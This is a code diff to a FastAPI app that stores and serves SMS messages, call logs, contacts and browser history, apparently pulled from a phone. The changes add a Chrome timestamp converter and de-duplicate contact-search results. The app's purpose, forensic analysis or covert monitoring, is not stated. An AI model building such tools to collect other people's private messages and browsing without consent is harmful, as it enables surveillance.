@@ -10,6 +10,7 @@ from fastapi.responses import HTMLResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
 from dotenv import load_dotenv
+import datetime
 
 app = FastAPI()
 
@@ -278,13 +279,11 @@ async def pull_all_data(request: Request):
     save_call_logs()
     return {"message": "All data saved successfully."}
 
-# Tambahkan endpoint baru untuk mencari pengirim SMS terbanyak
 @app.get("/most-contacted")
 async def most_contacts(request: Request):
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     try:
-        # Query untuk menghitung jumlah SMS berdasarkan alamat (address)
         cursor.execute("""
             SELECT address, COUNT(*) as sms_count
             FROM sms
@@ -293,7 +292,6 @@ async def most_contacts(request: Request):
         """)
         sms_results = cursor.fetchall()
 
-        # Query untuk menghitung jumlah panggilan berdasarkan nomor (number)
         cursor.execute("""
             SELECT number, COUNT(*) as call_count
             FROM call_logs
@@ -316,7 +314,7 @@ async def most_contacts(request: Request):
             for row in call_results
         ]
 
-        # Gabungkan kedua hasil (SMS dan Call)
+        #  kedua hasil (SMS dan Call)
         combined_results = sms_senders + call_senders
         combined_results = sorted(combined_results, key=lambda x: x["count"], reverse=True)
 
@@ -336,14 +334,33 @@ async def pull_all_data(request: Request):
     save_call_logs()
     return {"message": "All data saved successfully."}
 
+
+def translate_timestamp(last_visit_time):
+    # Chrome/WebKit timestamp (microseconds since Jan 1, 1601)
+    epoch_start = datetime.datetime(1601, 1, 1)
+    converted_time = epoch_start + datetime.timedelta(microseconds=last_visit_time)
+    return converted_time.strftime('%Y-%m-%d %H:%M:%S')
+
 @app.get("/browser-history")
 async def get_browser_history(request: Request):
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
-    cursor.execute("SELECT * FROM browser_history")
+    cursor.execute("SELECT id, url, title, last_visit_time FROM browser_history")
     data = cursor.fetchall()
     conn.close()
-    return data
+    
+    # Convert timestamps
+    history = [
+        {
+            "id": row[0],
+            "url": row[1],
+            "title": row[2],
+            "last_visit_time": translate_timestamp(row[3])
+        }
+        for row in data
+    ]
+    
+    return history
 
 @app.get("/contacts")
 async def get_contacts(request: Request):
@@ -362,7 +379,6 @@ async def get_sms(request: Request):
     rows = cursor.fetchall()
     conn.close()
     
-    # Konversi hasil query menjadi format JSON
     sms_list = []
     for row in rows:
         sms_list.append({
@@ -397,7 +413,7 @@ def load_wordlist():
         raise HTTPException(status_code=404, detail="Wordlist file not found")
     except Exception as e:
         raise HTTPException(status_code=500, detail=f"Error loading wordlist: {str(e)}")
-
+    
 @app.get("/search-contact")
 async def search_contact(request: Request):
     try:
@@ -409,14 +425,18 @@ async def search_contact(request: Request):
         cursor = conn.cursor()
         
         results = []
+        seen_numbers = set()  # Set untuk menyimpan nomor yang sudah ditambahkan
+        
         for word in wordlist:
             # Query untuk mencari nama kontak yang cocok secara case-insensitive
             cursor.execute("SELECT name, number FROM contacts WHERE LOWER(name) = ?", (word.lower(),))
             matches = cursor.fetchall()
             
-            # Tambahkan hasil ke daftar
+            # Tambahkan hasil ke daftar jika nomor belum ada
             for match in matches:
-                results.append({"name": match[0], "number": match[1]})
+                if match[1] not in seen_numbers:  
+                    results.append({"name": match[0], "number": match[1]})
+                    seen_numbers.add(match[1])  # Tandai nomor sebagai sudah dimasukkan
         
         # Tutup koneksi database
         conn.close()
@@ -424,6 +444,7 @@ async def search_contact(request: Request):
         return results
     except Exception as e:
         raise HTTPException(status_code=500, detail=f"Error searching contacts: {str(e)}")
+
     
 @app.get("/call-logs")
 async def get_call_logs(request: Request):
